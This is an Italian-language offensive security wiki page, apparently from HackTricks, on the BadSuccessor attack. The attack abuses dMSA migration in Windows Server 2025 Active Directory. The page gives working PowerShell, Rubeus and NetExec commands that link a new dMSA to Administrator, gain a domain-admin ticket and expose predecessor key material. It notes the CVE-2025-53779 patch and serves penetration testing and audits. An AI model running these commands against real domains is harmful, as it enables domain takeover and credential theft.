# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

**BadSuccessor** abusa del workflow di migrazione degli **Managed Service Account delegati** (**dMSA**) introdotto in **Windows Server 2025**. Un dMSA può essere collegato a un account legacy tramite **`msDS-ManagedAccountPrecededByLink`** e spostato attraverso gli stati di migrazione memorizzati in **`msDS-DelegatedMSAState`**. Se un attacker può creare un dMSA in una OU scrivibile e controllare tali attributi, il KDC può emettere ticket per il dMSA controllato dall'attacker con il **contesto di autorizzazione dell'account collegato**.<sup>[[2]](#references)</sup>

In pratica, ciò significa che un utente con pochi privilegi che dispone soltanto di diritti delegati sulla OU può creare un nuovo dMSA, associarlo ad `Administrator`, completare lo stato di migrazione e quindi ottenere un TGT il cui PAC contiene gruppi privilegiati come **Domain Admins**.<sup>[[2]](#references)</sup>

## Dettagli della migrazione dMSA rilevanti

- dMSA è una feature di **Windows Server 2025**.
- `Start-ADServiceAccountMigration` imposta la migrazione nello stato **started**.
- `Complete-ADServiceAccountMigration` imposta la migrazione nello stato **completed**.
- `msDS-DelegatedMSAState = 1` indica che la migrazione è iniziata.
- `msDS-DelegatedMSAState = 2` indica che la migrazione è stata completata.
- Durante una migrazione legittima, il dMSA dovrebbe sostituire in modo trasparente l'account superato, pertanto KDC/LSA preservano gli accessi di cui l'account precedente disponeva già.<sup>[[3]](#references)</sup>

Microsoft Learn specifica inoltre che durante la migrazione l'account originale viene associato al dMSA e che il dMSA dovrebbe poter accedere alle stesse risorse a cui poteva accedere il vecchio account.<sup>[[3]](#references)</sup> Questa è l'ipotesi di sicurezza di cui abusa BadSuccessor.<sup>[[2]](#references)</sup>

## Requisiti

1. Un dominio in cui esiste dMSA, ovvero con supporto **Windows Server 2025** presente sul lato AD.
2. L'attacker può **creare** oggetti `msDS-DelegatedManagedServiceAccount` in una OU, oppure dispone di equivalenti diritti estesi di creazione di oggetti figlio.
3. L'attacker può **scrivere** gli attributi dMSA rilevanti o controlla completamente il dMSA appena creato.
4. L'attacker può richiedere ticket Kerberos da un contesto aggiunto al dominio o da un tunnel che raggiunge LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Verifiche pratiche

L'indicatore operativo più chiaro consiste nel verificare il livello del dominio/forest e confermare che l'ambiente stia già utilizzando il nuovo stack Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Se visualizzi valori come `Windows2025Domain` e `Windows2025Forest`, considera **BadSuccessor / dMSA migration abuse** un controllo prioritario.

Puoi anche enumerare le OU scrivibili delegate per la creazione di dMSA con strumenti pubblici:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Flusso di abuso

1. Crea un dMSA in un'OU dove disponi di diritti delegati di creazione di elementi figlio.
2. Imposta **`msDS-ManagedAccountPrecededByLink`** sul DN di un target con privilegi, come `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Imposta **`msDS-DelegatedMSAState`** su `2` per contrassegnare la migrazione come completata.
4. Richiedi un TGT per il nuovo dMSA e utilizza il ticket restituito per accedere ai servizi privilegiati.<sup>[[2]](#references)</sup>

Esempio PowerShell:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Esempi di richieste di ticket / strumenti operativi:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Perché è più di una privilege escalation

Durante una migrazione legittima, Windows deve anche consentire alla nuova dMSA di gestire i ticket emessi per l'account precedente prima del cutover. Per questo motivo, il materiale dei ticket correlati a dMSA può includere le chiavi **current** e **previous** nel flusso **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Per una fake migration controllata dall'attaccante, questo comportamento può trasformare BadSuccessor in:<sup>[[2]](#references)</sup>

- **Privilege escalation** tramite l'ereditarietà dei SID dei gruppi privilegiati nel PAC.
- **Esposizione del materiale delle credenziali**, perché la gestione della chiave previous può esporre materiale equivalente all'hash RC4/NT del predecessore nei workflow vulnerabili.

Questo rende la tecnica utile sia per il domain takeover diretto sia per operazioni successive, come pass-the-hash o una compromissione più ampia delle credenziali.

## Note sullo stato delle patch

Il comportamento originale di BadSuccessor **non è soltanto un problema teorico relativo alla preview del 2025**. Microsoft gli ha assegnato **CVE-2025-53779** e ha pubblicato un security update nell'**agosto 2025**.<sup>[[4]](#references)</sup> Mantieni documentato questo attack per:

- **lab / CTF / esercitazioni assume-breach**
- **ambienti Windows Server 2025 senza patch**
- **verifica delle deleghe OU e dell'esposizione dMSA durante gli assessment**

Non presumere che un dominio Windows Server 2025 sia vulnerabile solo perché esiste dMSA; verifica il livello delle patch ed esegui i test con attenzione.

## Tools

- [Tooling BadSuccessor di Akamai](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Modulo `badsuccessor` di NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - abuso di dMSA con BadSuccessor fino a Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: abuso di dMSA per effettuare privilege escalation in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - panoramica delle Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
